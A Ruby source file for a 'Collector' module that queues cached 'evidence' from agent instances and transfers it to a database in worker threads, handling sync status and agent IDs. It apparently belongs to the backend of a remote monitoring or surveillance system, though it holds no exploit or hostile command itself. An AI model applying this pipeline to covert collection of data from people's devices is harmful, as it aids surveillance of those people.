#
#  Evidence Transfer module for transferring evidence to the db
#

require_relative 'db.rb'
require_relative 'evidence_manager.rb'

# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/symbolize'

# from system
require 'thread'

module RCS
module Collector

class EvidenceTransfer
  include Singleton
  include RCS::Tracer

  STATUS_PROCESSING = 1
  STATUS_IDLE = 0

  def initialize
    @evidences = {}
    @worker = Thread.new { self.work }
    # the mutex to avoid race conditions
    @semaphore = Mutex.new
  end

  def send_cached
    trace :info, "Transferring cached evidence to the db..."

    # for every instance, get all the cached evidence and send them
    EvidenceManager.instance.instances.each do |instance|
      EvidenceManager.instance.evidence_ids(instance).each do |id|
        self.queue instance, id
      end
    end
  end

  def queue(instance, id)
    # add the id to the queue
    @semaphore.synchronize do
      @evidences[instance] ||= []
      @evidences[instance] << id
    end
  end

  def work
    # infinite loop for working
    loop do
      # pass the control to other threads
      sleep 1

      # don't try to transfer if the db is down
      next unless DB.instance.connected?

      # keep an eye on race conditions...
      # copy the value and don't keep the resource locked too long
      instances = @semaphore.synchronize { @evidences.each_key.to_a }

      # for each instance get the ids we have and send them
      instances.each do |instance|
        # one thread per instance, but check if an instance is already under processing
        Thread.new do
          begin

            # get the status of this instance to check if we already have a thread processing it
            status = EvidenceManager.instance.instance_get_processing instance

            # only perform the job if we have something to transfer
            if not @evidences[instance].empty? and not status == STATUS_PROCESSING

              # mark this instance under processing
              EvidenceManager.instance.instance_set_processing instance, STATUS_PROCESSING

              # get the info from the instance
              info = EvidenceManager.instance.instance_info instance
              raise "Cannot read info for #{instance}" if info.nil?

              # make sure that the symbols are present
              # we are doing this hack since we are passing information taken from the store
              # and passing them as they were a session
              sess = info.symbolize

              # if the session bid is zero, it means that we have collected the evidence
              # when the DB was DOWN. we have to ask again to the db the real bid of the instance
              if sess[:bid] == "0" or sess[:bid] == 0 then
                # ask the database the bid of the agent
                status, bid = DB.instance.agent_status(sess[:ident], sess[:instance], sess[:subtype])
                sess[:bid] = bid
                raise "agent _id cannot be ZERO" if bid == 0
              end

              # update the status in the db
              DB.instance.sync_start sess, info['version'], info['user'], info['device'], info['source'], info['sync_time']

              # transfer all the evidence
              while (id = @evidences[instance].shift)
                self.transfer instance, id, @evidences[instance].count
              end

              # the sync is ended
              DB.instance.sync_end sess
            end
          rescue Exception => e
            trace :error, "Error processing evidences: #{e.message}"
            trace :error, e.backtrace
          ensure
            # mark this instance free from
            EvidenceManager.instance.instance_set_processing instance, STATUS_IDLE

            # job done, exit
            Thread.exit
          end
        end
      end
    end
  end

  def transfer(instance, id, left)
    evidence = EvidenceManager.instance.get_evidence(id, instance)

    trace :info, "Transfer to db [#{instance}] #{evidence.size.to_s_bytes} - #{left} left to send"

    # send and delete the evidence
    ret, error = DB.instance.send_evidence(instance, evidence)

    if ret then
      EvidenceManager.instance.del_evidence(id, instance)
    else
      trace :error, "Evidence NOT transferred: #{error}"
    end
    
  end

end
  
end #Collector::
end #RCS::